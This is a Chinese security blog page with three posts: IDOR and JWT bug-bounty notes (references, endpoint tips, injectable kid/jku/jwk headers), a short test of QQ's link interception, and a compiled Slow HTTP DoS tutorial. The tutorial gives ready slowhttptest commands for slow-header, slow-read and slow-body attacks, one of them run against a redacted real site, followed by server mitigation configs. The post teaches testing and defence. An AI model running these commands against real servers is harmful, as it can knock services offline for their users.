<li>参考 <a target="_blank" rel="noopener" href="https://medium.com/@aysebilgegunduz/everything-you-need-to-know-about-idor-insecure-direct-object-references-375f83e03a87">Everything You Need to Know About IDOR (Insecure Direct<br>Object<br>References)</a><br><a target="_blank" rel="noopener" href="https://www.aon.com/cyber-solutions/aon_cyber_labs/finding-more-idors-tips-and-tricks/">Finding more IDORs - Tips and Tricks |<br>Aon</a><br><a target="_blank" rel="noopener" href="https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR-Old.md">KathanP19&#x2F;HowToHunt</a><br><a target="_blank" rel="noopener" href="https://www.bugbountyhunter.com/vulnerability/?type=idor">Learn about Insecure Object Reference (IDOR) |<br>BugBountyHunter.com</a><br><a target="_blank" rel="noopener" href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.html">WSTG -<br>v4.2</a><br><a target="_blank" rel="noopener" href="https://notes.mufaddal.info/web/idor">IDOR (Insecure Direct Object<br>Reference)</a> <a target="_blank" rel="noopener" href="https://medium.com/@Sm9l/what-i-learnt-from-reading-220-idor-bug-reports-6efbea44db7">What I learnt<br>from reading 220* IDOR bug<br>reports.</a></li>
</ul>
<p>Medium 报告： <a target="_blank" rel="noopener" href="https://mokhansec.medium.com/full-account-takeover-worth-1000-think-out-of-the-box-808f0bdd8ac7">Full account takeover worth $1000 Think out of the<br>box</a><br><a target="_blank" rel="noopener" href="https://infosecwriteups.com/all-about-getting-first-bounty-with-idor-849db2828c8">All About Getting First Bounty with<br>IDOR</a><br><a target="_blank" rel="noopener" href="https://vedanttekale20.medium.com/idor-that-allowed-me-to-takeover-any-users-account-129e55871d8">IDOR that allowed me to takeover any users<br>account.</a><br><a target="_blank" rel="noopener" href="https://betterprogramming.pub/all-about-idor-attacks-64c4203b518e">All About IDOR<br>Attacks</a><br><a target="_blank" rel="noopener" href="https://amineaboud.medium.com/access-developer-tasks-list-of-any-of-facebook-application-graphql-idor-62307c5e5b34">Access developer tasks list of any of Facebook Application (GraphQL<br>IDOR)</a></p>
<p>Tips</p>
</blockquote>
<pre><code>#1 https://twitter.com/M0_SADAT/status/1361289751597359105
Looking for high impact IDOR?
Always try to find the hidden parameters for this endpoints using Arjun and Parameth
/settings/profile
/user/profile
/user/settings
/account/settings
/username
/profile
And any payment endpoint

Pro tip: Don’t forget to try create/update/delete operations on objects that are publicly readable but shouldn’t be writable. Can you PUT to /api/products and change a price?
</code></pre>
<h3><span id="jwt">JWT</span></h3><h4><span id="介绍">介绍</span></h4><blockquote>
<p>JWT 最常用于授权。 JSON Web 令牌 （JWT）<br>是一种标准化格式，用于在双方之间安全地交换数据。<br>它是紧凑的、可读的，并且由身份提供者 （IdP）<br>使用私钥&#x2F;或公钥对进行数字签名。因此，令牌的完整性和真实性可以由其他相关方进行验证。<br>使用 JWT 的目标不是隐藏数据，而是确保数据的真实性。JWT<br>是经过签名和编码的，而不是加密的。 JWT<br>是一种基于令牌的无状态身份验证机制。由于它是客户端无状态会话，因此服务器不必仅依靠数据存储（数据库）来保存会话信息。</p>
<p>它由三个要素组成：<code>header.payload.signature</code> 1.标头 - JWT<br>标头由用于签名和编码的令牌类型和算法组成。算法可以是HMAC，SHA256，RSA，HS256或RS256。<br>2.有效负载 - 这也是一个 JSON 对象，用于存储用户的信息，如<br>ID、用户名、角色、令牌生成时间和其他自定义声明。 3.签名 - JSON Web<br>令牌最关键的方面是其签名 （JWT）。签名是通过使用 Base64url<br>编码对标头和有效负载进行编码并使用句点分隔符<br>（.）。此信息随后传递到加密算法。因此，如果标头或有效负载发生更改，则必须再次计算签名。只有身份提供程序<br>（IdP） 有权访问用于生成签名的私钥，这禁止令牌操作。</p>
<p>JWT 可以使用称为对称和非对称加密的两种加密机制生成：<br>对称：此机制需要单个密钥来创建和验证<br>JWT。这种类型的最常见算法是HS256。<br>非对称：此机制需要公钥进行验证，需要私钥对签名进行签名。这种类型的最常见算法是RS256。</p>
<p>密钥<br>ID（kid）是具有字符串类型的可选标头，用于标识文件系统或数据库中的特定密钥，然后使用其内容验证签名。如果应用程序具有多个用于对令牌进行签名的密钥，则此参数很有用，但如果它是可注入的，则可能会出现问题，因为攻击者可以引用具有可预测内容的特定文件。</p>
<p>除了密钥 ID 之外，JSON Web 令牌标准还为开发人员提供了通过 URL<br>指定密钥的能力。 令牌标头包含版本（”ver”）声明。它包含所使用的 JWT<br>令牌库的版本。 jku 标头参数 - JKU 是”JWK Set<br>URL”的缩写。它是一个可选的标头字段，用于指定引用验证令牌所需的密钥集合的<br>URL。如果未正确控制此字段且允许此字段，则攻击者可能会托管自己的密钥文件，并声明应用程序使用它来验证令牌。<br>jwk 标头参数 - 可选的 JWK（JSON Web<br>密钥）标头参数允许攻击者将用于验证令牌的密钥直接嵌入到令牌中。 x5u 和<br>x5c 标头参数 - x5u 和 x5c 标头参数（如 jku 和 jwk<br>标头）允许攻击者定义用于验证令牌的公钥证书或证书链。 x5u 以 URI<br>形式定义信息，而 x5c 允许将证书数据合并到令牌中。 x5t 参数 -<br>“x5t”（x.509 证书指纹）标头参数返回 X.509 证书的 DER 编码的 base64url<br>编码的 SHA-256<br>指纹（即摘要），可用于匹配证书。结果，它相当于密钥标识符或孩子声明！！</p>
<p>在有效负载部分，你可能还会发现： JTI 参数，用于防止对 JWT 的重放攻击<br>iss 参数 - 颁发令牌的实体名称 iat 参数 - 标识不得接受 JWT<br>令牌进行处理的时间</p>
</blockquote>
<h3><span id="未完待续">未完待续</span></h3>

        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/SRC/" rel="tag">SRC</a><a class="tag-none-link" href="/tags/Skadi/" rel="tag">Skadi</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/09/Request-Response-QQ/">
                QQ 移动端访问控制策略小窥
            </a>
        </h2>
    
    <time>
        Aug 9, 2022
    </time>
    <section class="content">
        <h1><span id="qq-移动端访问控制策略小窥">QQ 移动端访问控制策略小窥</span></h1><h2><span id="起因">起因</span></h2><blockquote>
<p>今天在学习 SRC 发掘的时候，看到很多介绍文章其实在 Hackone 上就有应用例，然后看到一篇需要权限访问的文章，遂要求登录。</p>
<p>还没有个人账号，于是注册一下，到最后一步得到一个邮箱确认链接：</p>
<p><img src="/2022/08/09/Request-Response-QQ/1.jpg" alt="image"></p>
<p>由于是公司电脑，没有装额外通讯软件，遂在手机 click，果不其然被 QQ 拦截了<del>（这个做的真的不行）</del>：</p>
<p><img src="/2022/08/09/Request-Response-QQ/2.jpg" alt="image"></p>
<p>于是我把链接 copy 到 PC 上，重新访问，结果弹出该链接已经被使用了的页面，并且可以要求 Resend：</p>
<p><img src="/2022/08/09/Request-Response-QQ/3.jpg" alt="image"></p>
</blockquote>
<h2><span id="推测">推测</span></h2><blockquote>
<p>我顿了一下（柯南 BGM）：这个确认链接（token）已经被访问，只有可能是我刚才手机 click 了 button 导致的，也就是发送了请求（request），但是没有收到正确回应（response）。</p>
<p>即 TX 是帮你请求过一次链接的<del>（说好听点是帮你，说不好听就是劫持&#x3D; &#x3D;）</del>，他拦截的只是响应包。</p>
<ul>
<li>这样会有两个问题：</li>
</ul>
<ol>
<li>服务端是否是不分情况就去请求了这个链接的，如果换做是其他小公司的服务端这个策略应该是有问题的。</li>
<li>你是按照什么来判断网站不合规的？证书？白名单？响应包内容？<br>如果是证书，很多 http 链接就会被误报；如果是白名单，那么不需要放行请求（request）就可以判断并拦截；如果是响应（response）内容，为什么 Hackone 还是拦了？</li>
</ol>
<p><img src="/2022/08/09/Request-Response-QQ/1.gif" alt="image"></p>
</blockquote>
<h2><span id="验证">验证</span></h2><blockquote>
<p>在朋友（无中生友）的提醒下，发现可以用 dnslog 一试就能验证是否是进行了请求而拦截响应：</p>
<p><img src="/2022/08/09/Request-Response-QQ/4.jpg" alt="image"></p>
<p><img src="/2022/08/09/Request-Response-QQ/5.jpg" alt="image"></p>
<p><del>其实我都不用打码，反正一个是 TX 的 ip，一个是电信的移动 ip</del></p>
</blockquote>
<h2><span id="结语">结语</span></h2><blockquote>
<p>也就是小小发现而已，或许还火星了，记录一下<br>PS：微信现在还没有拦截限制好像，从那个上面倒是可以直接访问链接</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/08/Slow-HTTP-Dos/">
                Slow HTTP Dos
            </a>
        </h2>
    
    <time>
        Aug 8, 2022
    </time>
    <section class="content">
        <h1><span id="http慢速拒绝服务攻击slow-http-dos">HTTP慢速拒绝服务攻击（Slow HTTP Dos）</span></h1><blockquote>
<p>本文摘自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/13409171.html">春告鳥</a>及<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/285282.html">libaisec</a></p>
</blockquote>
<h2><span id="http慢速拒绝服务攻击简介">HTTP慢速拒绝服务攻击简介</span></h2><blockquote>
<p>HTTP慢速攻击是利用HTTP合法机制，以极低的速度往服务器发送HTTP请求，尽量长时间保持连接，不释放，若是达到了Web Server对于并发连接数的上限，同时恶意占用的连接没有被释放，那么服务器端将无法接受新的请求，导致拒绝服务。</p>
</blockquote>
<h2><span id="http慢速攻击原理摘抄自倾旋师傅的博客httpspayloadsonlinearchivers2018-04-162">HTTP慢速攻击原理（摘抄自倾旋师傅的博客:</span></h2><blockquote>
<p>既然是一个HTTP协议的缓慢攻击，这就要从HTTP协议说起了。</p>
<p>首先HTTP协议的报文都是一行一行的，类似于：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host : payloads.online\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Keep-Alive: <span class="number">900</span>\r\n</span><br><span class="line">Content-Length: <span class="number">100000000</span>\r\n</span><br><span class="line">Content_Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Accept: *.*\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<blockquote>
<p>那么报文中的\r\n是什么？</p>
<p>\r\n代表一行报文的结束也被称为空行（CRLF），而\r\n\r\n代表整个报文的结束</p>
<p>从上面贴出的GET请求包可以看出，我们的客户端请求到服务器后，告知服务器这个连接需要保留。</p>
<p>通常我们知道HTTP协议采用“请求-应答”模式，当使用普通模式，即非KeepAlive模式时，每个请求&#x2F;应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP协议为无连接的协议）；当使用Keep-Alive模式（又称持久连接、连接重用）时，Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。</p>
<p>那么当我们客户端发送一个报文，不以CRLF结尾，而是10s发送一行报文，我们的报文需要80s才能发送完毕，这80s内，服务器需要一直等待客户端的CRLF，然后才能解析这个报文。</p>
<p>如果客户端使用更多的程序发送这样的报文，那么服务器端会给客户端留出更多的资源来处理、等待这迟迟不传完的报文。假设服务器端的客户端最大连接数是100个，我们使用测试程序先连接上100次服务器端，并且报文中启用Keep-Alive，那么其他正常用户101、102就无法正常访问网站了。</p>
<p>简单来说，就是我们每次只发一行，每次发送之间的间隔时间很长，这迟迟未发送结束的HTTP包会占用服务端的资源，当达到服务端处理请求的上限时，这时候再用户对网站正常请求，服务端也处理不了了，导致了拒绝服务。</p>
</blockquote>
<h2><span id="http慢速攻击分类">HTTP慢速攻击分类</span></h2><blockquote>
<p>HTTP慢速攻击分为三类：</p>
<ul>
<li>Slow headers</li>
<li>Slow body</li>
<li>Slow read</li>
</ul>
</blockquote>
<h3><span id="1slow-headers">1，Slow headers</span></h3><blockquote>
<p>第一类是最经典的HTTP Slow慢速攻击，由rsnake发明的，原理在上面已介绍。</p>
</blockquote>
<h3><span id="2slow-body">2，Slow body</span></h3><blockquote>
<p>第二类也叫做Slow HTTP POST</p>
<p>原理为在POST提交方式中，允许在HTTP的头中声明content-length，即POST内容的长度。</p>
<p>提交了恶意头之后，将需要传输的body缓慢进行发送，跟Slow headers类似，导致服务器端长时间等待需要传输的POST数据，当请求的数量变多后，达到了消耗服务器资源的效果，导致服务器宕机。</p>
</blockquote>
<h3><span id="3slow-read-attack">3，Slow Read attack</span></h3><blockquote>
<p>第三类攻击方式采用调整TCP协议中滑动窗口大小，来对服务器单次发送的数据大小进行控制，使得服务器需要对一个相应包分为很多个包来发送，想要使这种攻击效果明显，请求的资源要尽量大，这里很容易理解，当请求的资源越大，返回包才越大，这样才能分成更多的包让服务器发送，导致拒绝服务的产生。</p>
<p>也就是说，客户端以极低的速度来读取返回包，来消耗服务器的连接和内存资源。</p>
</blockquote>
<h2><span id="http慢速攻击实战">HTTP慢速攻击实战</span></h2><blockquote>
<p>一般使用slowhttptest工具（安装方式很多，不再赘述）</p>
</blockquote>
<h3><span id="工具简介">工具简介</span></h3><blockquote>
<p>SlowHTTPTest是一个可配置的应用层拒绝服务攻击测试工具，它可以工作在Linux，OSX和Cygwin环境以及Windows命令行接口，可以帮助安全测试人员检验服务器对慢速攻击的处理能力。</p>
<p>这个工具可以模拟低带宽耗费下的DoS攻击，比如慢速攻击，慢速HTTP POST，通过并发连接池进行的慢速读攻击（基于TCP持久时间）等。慢速攻击基于HTTP协议，通过精心的设计和构造，这种特殊的请求包会造成服务器延时，而当服务器负载能力消耗过大即会导致拒绝服务。</p>
</blockquote>
<h3><span id="使用参数介绍">使用参数介绍</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">测试模式:</span><br><span class="line">-H                            slow header,slowloris默认采用此模式          </span><br><span class="line">-B                            slow body</span><br><span class="line">-R                            远程攻击又名Apache killer</span><br><span class="line">-X                            slow <span class="built_in">read</span></span><br><span class="line">​</span><br><span class="line">报告选项：</span><br><span class="line">-g                            生成具有套接字状态更改的统计信息（默认关闭）</span><br><span class="line">-o file_prefix                将统计信息输出保存在file.html和file.csv中（需要-g）</span><br><span class="line">-v level                      日志信息，详细级别0-4：致命，信息，错误，警告，调试</span><br><span class="line">​</span><br><span class="line">常规选项：</span><br><span class="line">-c connections                连接目标连接数（50）</span><br><span class="line">-i seconds                    后续数据之间的间隔（以秒为单位）（10）</span><br><span class="line">-l seconds                    测试目标时间长度，以秒为单位（240）</span><br><span class="line">-r rate                       每秒连接数（50）</span><br><span class="line">-s                            如果需要，Content-Length标头的值（4096）</span><br><span class="line">-t                            在请求中使用的动词，对于slow header和response，默认为GET；对于slow body，默认为POST</span><br><span class="line">-u URL                        目标的绝对URL（http://localhost/）</span><br><span class="line">-x                            在slowloris and Slow POST tests模式中，指定发送的最大数据长度</span><br><span class="line">-f                            Content-Type标头的值（application/x-www-form-urlencoded）</span><br><span class="line">-m                            接受(Accept)标头的值（text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5）</span><br><span class="line">​</span><br><span class="line">探测/代理选项：</span><br><span class="line">-d host:port                  为所有连接指定代理</span><br><span class="line">-e host:port                  为探测连接指定代理</span><br><span class="line">-p seconds                    指定等待时间来确认DoS攻击已经成功</span><br><span class="line">​</span><br><span class="line">range attack特定选项：</span><br><span class="line">-a                            标头中的起始位置</span><br><span class="line">-b                            标头中的结束位置</span><br><span class="line">​</span><br><span class="line">slow <span class="built_in">read</span>特定选项：</span><br><span class="line">-k                            在连接中重复相同请求的次数。如果服务器支持永久连接，则用于成倍增加响应大小。</span><br><span class="line">-n                            从recv缓冲区读取操作之间的时间间隔，以秒为单位（1）</span><br><span class="line">-w                            slow <span class="built_in">read</span>模式中指定tcp窗口范围下限</span><br><span class="line">-y                            slow <span class="built_in">read</span>模式中指定tcp窗口范围上限</span><br><span class="line">-z                            在每次的<span class="built_in">read</span>中，从buffer中读取数据量</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于三种类型的慢速攻击，分别给出payload：（摘抄的！）</p>
</blockquote>
<h3><span id="slow-header">Slow Header</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -H -i 10 -r 200 -s 8192 -t SLOWHEADER -u http://vulurl.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该攻击会像我们刚才讲的慢速传递HTTP报文，占用服务器资源让其等待我们最后的CRLF。</p>
</blockquote>
<h3><span id="slow-read">Slow Read</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -X -r 1000 -w 10 -y 20 -t SLOWREAD -n 5 -z 32 -u http://vulurl.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该攻击会在Web服务器响应内容传输回来的时候，我们客户端缓慢的读取响应报文，这样服务器端也会一直等待客户端来接收完毕。</p>
</blockquote>
<h3><span id="slow-post">Slow Post</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u http://vulurl.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该攻击会构造一个POST数据包，将数据缓慢传输，使服务器端一直等待接收报文。</p>
<p>找一个存在漏洞的网址进行检测：</p>
<p>使用Slow Post的payload：（漏洞网址已高码）</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u https://xxxxxx</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2022/08/08/Slow-HTTP-Dos/1.png" alt="image"></p>
<p>当显示为NO，则表示存在HTTP慢速攻击漏洞，可导致拒绝服务。</p>
</blockquote>
<h2><span id="解决办法">解决办法</span></h2><blockquote>
<p>针对不同的Server其对慢速http拒绝服务攻击防范方法也不同：</p>
</blockquote>
<h3><span id="websphere">WebSphere</span></h3><blockquote>
<p>1、限制 HTTP 数据的大小</p>
<p>在WebSphere Application Server 中进行如下设置：</p>
<p>任何单个 HTTP 头的默认最大大小为 32768 字节。可以将它设置为不同的值。</p>
<p>HTTP 头的默认最大数量为 50。可以将它设置为不同的限制值。</p>
<p>另一种常见的 DOS 攻击是发送一个请求，这个请求会导致一个长期运行的 GET 请求。WebSphere Application Server Plug-in 中的 ServerIOTimeoutRetry 属性可限制任何请求的重试数量。这可以降低这种长期运行的请求的影响。</p>
<p>设置限制任何请求正文的最大大小。</p>
</blockquote>
<blockquote>
<p>2、设置keepalive参数</p>
<p>打开ibm http server安装目录，打开文件夹conf，打开文件httpd.conf,查找KeepAlive值，改ON为OFF,其默认为ON。</p>
<p>这个值说明是否保持客户与HTTP SERVER的连接，如果设置为ON，则请求数到达MaxKeepAliveRequests设定值时请求将排队，导致响应变慢。</p>
</blockquote>
<blockquote>
<p>详见<a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/cn/websphere/techjournal/1210_lansche/1210_lansche.html#new-step32">参考链接</a></p>
</blockquote>
<h3><span id="weblogic">Weblogic</span></h3><blockquote>
<p>1、在配置管理界面中的协议-&gt;一般信息下设置 完成消息超时时间小于200</p>
</blockquote>
<blockquote>
<p>2、在配置管理界面中的协议-&gt;HTTP下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。</p>
</blockquote>
<blockquote>
<p>详见<a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/E12890_01/ales/docs32/integrateappenviron/configWLS.html#wp1101063">参考链接</a></p>
</blockquote>
<h3><span id="nginx">Nginx</span></h3><blockquote>
<p>1、通过调整$request_method，配置服务器接受http包的操作限制；</p>
</blockquote>
<blockquote>
<p>2、在保证业务不受影响的前提下，调整</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">client_max_body_size</span><br><span class="line">client_body_buffer_size</span><br><span class="line">client_header_buffer_size</span><br><span class="line">large_client_header_buffersclient_body_timeout</span><br><span class="line">client_header_timeout</span><br></pre></td></tr></table></figure>

<blockquote>
<p>的值，必要时可以适当的增加；</p>
</blockquote>
<blockquote>
<p>3、对于会话或者相同的ip地址，可以使用HttpLimitReqModule and HttpLimitZoneModule参数去限制请求量或者并发连接数；</p>
</blockquote>
<blockquote>
<p>4、根据CPU和负载的大小，来配置worker_processes 和 worker_connections的值，公式是：max_clients &#x3D; worker_processes * worker_connections。</p>
</blockquote>
<h3><span id="apache">Apache</span></h3><blockquote>
<p>建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。</p>
</blockquote>
<blockquote>
<p>1、mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#请求头部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slowloris型的慢速攻击。</span></span><br><span class="line"></span><br><span class="line">RequestReadTimeout header=10-40,minrate=500</span><br><span class="line"></span><br><span class="line"><span class="comment">#请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。</span></span><br><span class="line"></span><br><span class="line">RequestReadTimeout body=10-40,minrate=500</span><br></pre></td></tr></table></figure>

<blockquote>
<p>需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。<br>示例：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule reqtimeout_module modules/mod_reqtimeout.so</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">reqtimeout_module</span>&gt;</span></span><br><span class="line">        RequestReadTimeout header=10-40,minrate=500 body=10-40,minrate=500</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>2、mod_qos用于控制并发连接数。配置例如：</p>
<p>当服务器并发连接数超过600时，关闭keepalive<br><code>QS_SrvMaxConnClose 600</code></p>
<p>限制每个源IP最大并发连接数为50<br><code>QS_SrvMaxConnPerIP 50</code><br>这两个数值可以根据服务器的性能调整。</p>
</blockquote>
<blockquote>
<p>更多关于qos_module配置<a target="_blank" rel="noopener" href="http://mod-qos.sourceforge.net/dos.html">参考</a><br>示例：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoadModule qos_module modules/mod_qos.so</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">qos_module</span>&gt;</span></span><br><span class="line">QS_SrvMaxConnClose 600</span><br><span class="line">QS_SrvMaxConnPerIP 50</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="ihs服务器">IHS服务器</span></h3><blockquote>
<p>请您先安装最新补丁包，然后启用mod_reqtimeout模块，在配置文件中加入：<br><code>LoadModule reqtimeout_module modules/mod_reqtimeout.so</code></p>
</blockquote>
<blockquote>
<p>为mod_reqtimeout模块添加配置：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_reqtimeout.c</span>&gt;</span></span><br><span class="line">RequestReadTimeout header=10-40,MinRate=500 body=10-40,MinRate=500</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于HTTPS站点，建议header&#x3D;20-40,MinRate&#x3D;500。</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=swg21652165">参见</a></p>
</blockquote>
<h3><span id="f5负载均衡">F5负载均衡</span></h3><blockquote>
<p>F5负载均衡设备有相应的防护模块，如无购买可参考附件中的详细配置过程。<br>关于F5的慢速攻击防护配置，请参考<a target="_blank" rel="noopener" href="https://support.f5.com/kb/en-us/solutions/public/10000/200/sol10260.html">Page1</a>,<a target="_blank" rel="noopener" href="https://devcentral.f5.com/articles/mitigating-slow-http-post-ddos-attacks-with-irules-ndash-follow-up">Page2</a></p>
</blockquote>
<h3><span id="iis服务器">IIS服务器</span></h3><blockquote>
<p>IIS可配置相关网站的Web.config如下：</p>
</blockquote>
<blockquote>
<p>1、WebLimits设置：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.applicationHost</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">webLimits</span> <span class="attr">connectionTimeout</span>=<span class="string">&quot;00:00:30&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">headerWaitTimeout</span>=<span class="string">&quot;00:00:10&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">dynamicIdleThreshold</span>=<span class="string">&quot;150&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">minBytesPerSecond</span>=<span class="string">&quot;512&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.applicationHost</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考以下<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/weblimits#configuration">链接</a></p>
</blockquote>
<blockquote>
<p>2、headerLimits设置：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">requestLimits</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">headerLimits</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">add</span> <span class="attr">header</span>=<span class="string">&quot;Content-type&quot;</span> <span class="attr">sizeLimit</span>=<span class="string">&quot;100&quot;</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">headerLimits</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">requestLimits</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/iis/configuration/system.webserver/security/requestfiltering/requestlimits/headerlimits/">参考</a></p>
</blockquote>
<h2><span id="参考链接">参考链接：</span></h2><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2018-04-16/2">https://payloads.online/archivers/2018-04-16/2</a></li>
